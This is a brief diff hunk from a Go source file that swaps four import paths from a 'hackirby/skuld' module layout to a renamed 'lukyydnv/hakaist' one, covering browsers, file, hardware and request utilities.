@@ -10,10 +10,10 @@ import (
 	"strconv"
 	"strings"
 
-	"github.com/hackirby/skuld/modules/browsers"
-	"github.com/hackirby/skuld/utils/fileutil"
-	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/requests"
+	"github.com/lukyydnv/hakaist/internal/core/browsers"
+	"github.com/lukyydnv/hakaist/pkg/utils/fileutil"
+	"github.com/lukyydnv/hakaist/pkg/utils/hardware"
+	"github.com/lukyydnv/hakaist/pkg/utils/requests"
 )
 
 var (
